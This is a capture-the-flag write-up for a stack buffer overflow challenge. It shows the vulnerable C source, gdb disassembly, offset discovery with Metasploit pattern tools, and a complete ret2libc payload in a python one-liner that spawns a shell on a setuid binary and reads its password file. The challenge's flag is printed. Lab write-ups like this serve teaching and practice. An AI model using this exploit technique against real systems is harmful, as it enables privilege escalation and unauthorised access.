<h1>ELF x86 - Stack buffer overflow basic 6</h1>
<h3>Description</h3>

```c
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
 
int main (int argc, char ** argv){
    char message[20];
 
    if (argc != 2){
        printf ("Usage: %s <message>\n", argv[0]);
        return -1;
    }
 
    setreuid(geteuid(), geteuid());
    strcpy (message, argv[1]);
    printf ("Your message: %s\n", message);
    return 0;
}
```
<h3>Solution</h3>
<label>Check overflow program ret2libc</label>

```console
┌──(root㉿Kali)-[/home/venom]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```
```console
app-systeme-ch33@challenge02:~$ gdb -q ch33
Reading symbols from ch33...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x080484e6 <+0>:	push   %ebp
   0x080484e7 <+1>:	mov    %esp,%ebp
   0x080484e9 <+3>:	push   %esi
   0x080484ea <+4>:	push   %ebx
   0x080484eb <+5>:	sub    $0x14,%esp
   0x080484ee <+8>:	call   0x8048420 <__x86.get_pc_thunk.bx>
   0x080484f3 <+13>:	add    $0x1b0d,%ebx
   0x080484f9 <+19>:	cmpl   $0x2,0x8(%ebp)
   0x080484fd <+23>:	je     0x804851b <main+53>
   0x080484ff <+25>:	mov    0xc(%ebp),%eax
   0x08048502 <+28>:	mov    (%eax),%eax
   0x08048504 <+30>:	push   %eax
   0x08048505 <+31>:	lea    -0x1a10(%ebx),%eax
   0x0804850b <+37>:	push   %eax
   0x0804850c <+38>:	call   0x8048370 <printf@plt>
   0x08048511 <+43>:	add    $0x8,%esp
   0x08048514 <+46>:	mov    $0xffffffff,%eax
   0x08048519 <+51>:	jmp    0x804855e <main+120>
   0x0804851b <+53>:	call   0x8048380 <geteuid@plt>
   0x08048520 <+58>:	mov    %eax,%esi
   0x08048522 <+60>:	call   0x8048380 <geteuid@plt>
   0x08048527 <+65>:	push   %esi
   0x08048528 <+66>:	push   %eax
   0x08048529 <+67>:	call   0x80483a0 <setreuid@plt>
   0x0804852e <+72>:	add    $0x8,%esp
   0x08048531 <+75>:	mov    0xc(%ebp),%eax
   0x08048534 <+78>:	add    $0x4,%eax
   0x08048537 <+81>:	mov    (%eax),%eax
   0x08048539 <+83>:	push   %eax
   0x0804853a <+84>:	lea    -0x1c(%ebp),%eax
   0x0804853d <+87>:	push   %eax
   0x0804853e <+88>:	call   0x8048390 <strcpy@plt>
   0x08048543 <+93>:	add    $0x8,%esp
   0x08048546 <+96>:	lea    -0x1c(%ebp),%eax
   0x08048549 <+99>:	push   %eax
   0x0804854a <+100>:	lea    -0x19fb(%ebx),%eax
   0x08048550 <+106>:	push   %eax
   0x08048551 <+107>:	call   0x8048370 <printf@plt>
   0x08048556 <+112>:	add    $0x8,%esp
   0x08048559 <+115>:	mov    $0x0,%eax
   0x0804855e <+120>:	lea    -0x8(%ebp),%esp
   0x08048561 <+123>:	pop    %ebx
   0x08048562 <+124>:	pop    %esi
   0x08048563 <+125>:	pop    %ebp
   0x08048564 <+126>:	ret    
---Type <return> to continue, or q <return> to quit---
End of assembler dump.
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Starting program: /challenge/app-systeme/ch33/ch33 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
warning: the debug information found in "/libold/i386-linux-gnu/libc-2.19.so" does not match "/libold/i386-linux-gnu/libc.so.6" (CRC mismatch).

Your message: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x31624130 in ?? ()

```
```console
                                                                                
┌──(root㉿Kali)-[/home/venom]
└─# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x31624130
[*] Exact match at offset 32
```
<label>Overflow pada offset 32, lanjut check address system, exit dan /bin/sh</label>

```console
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e67310 <system>
(gdb) print exit
$2 = {<text variable, no debug info>} 0xb7e5a260 <exit>
(gdb) info proc map
process 24405
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /challenge/app-systeme/ch33/ch33
	 0x8049000  0x804a000     0x1000        0x0 /challenge/app-systeme/ch33/ch33
	 0x804a000  0x804b000     0x1000     0x1000 /challenge/app-systeme/ch33/ch33
	0xb7e25000 0xb7e27000     0x2000        0x0 
	0xb7e27000 0xb7fd2000   0x1ab000        0x0 /libold/i386-linux-gnu/libc.so.6
	0xb7fd2000 0xb7fd4000     0x2000   0x1aa000 /libold/i386-linux-gnu/libc.so.6
	0xb7fd4000 0xb7fd5000     0x1000   0x1ac000 /libold/i386-linux-gnu/libc.so.6
	0xb7fd5000 0xb7fd9000     0x4000        0x0 
	0xb7fd9000 0xb7fdc000     0x3000        0x0 [vvar]
	0xb7fdc000 0xb7fde000     0x2000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /libold/i386-linux-gnu/ld-2.19.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /libold/i386-linux-gnu/ld-2.---Type <return> t----------------Type <return> to continue, or q <return> to quit---q
Quit
(gdb) find 0xb7e27000,0xb7fd5000,"/bin/sh"
0xb7f89d4c
1 pattern found.
```
<pre>
0xb7e67310 = system
0xb7e5a260 = exit
0xb7f89d4c = /bin/sh
</pre>
<label>Komposisi payload untuk ret2libc</label>
<pre>
JUNK*32 + address_system + address_exit + address_shell
</pre>

```console
app-systeme-ch33@challenge02:~$ ./ch33 $(python -c "print '\x41'*32 + '\x10\x73\xe6\xb7' + '\x60\xa2\xe5\xb7' + '\x4c\x9d\xf8\xb7'")
Your message: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAs�`��L���
$ ls
ch33  ch33.c  Makefile
$ ls -al
total 36
drwxr-x---  2 app-systeme-ch33-cracked app-systeme-ch33 4096 Dec 10  2021 .
drwxr-xr-x 18 root                     root             4096 Dec 10  2021 ..
-r-sr-x---  1 app-systeme-ch33-cracked app-systeme-ch33 7256 Dec 10  2021 ch33
-r--r-----  1 app-systeme-ch33-cracked app-systeme-ch33  366 Dec 10  2021 ch33.c
-rw-r-----  1 root                     root               44 Dec 10  2021 .git
-r--r-----  1 app-systeme-ch33-cracked app-systeme-ch33  657 Dec 10  2021 Makefile
-r--------  1 app-systeme-ch33-cracked app-systeme-ch33   19 Dec 10  2021 .passwd
-r--------  1 root                     root              791 Dec 10  2021 ._perms
$ cat .passwd
R3t2l1bcISnicet0o!
```
<h3>Flag</h3>
<pre>
R3t2l1bcISnicet0o!
</pre>
